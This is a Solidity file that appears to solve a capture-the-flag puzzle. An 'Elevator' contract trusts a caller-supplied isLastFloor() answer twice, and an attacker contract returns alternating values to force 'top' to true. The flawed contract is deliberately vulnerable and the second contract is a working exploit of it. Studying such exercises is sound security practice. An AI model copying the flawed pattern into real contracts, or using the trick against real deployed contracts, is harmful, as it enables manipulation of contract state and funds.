pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorSolution is Building {
    bool public switchVal;

    constructor() public {
        switchVal = false;
    }

    function hack(address _challengeAddress) external {
        Elevator challenge = Elevator(_challengeAddress);
        challenge.goTo(uint(1));

        require(challenge.top(), "Did not make it");
    }

    function isLastFloor(uint) external override returns (bool) {
        bool returnVal = switchVal;
        switchVal = !switchVal;

        return returnVal;
    }
}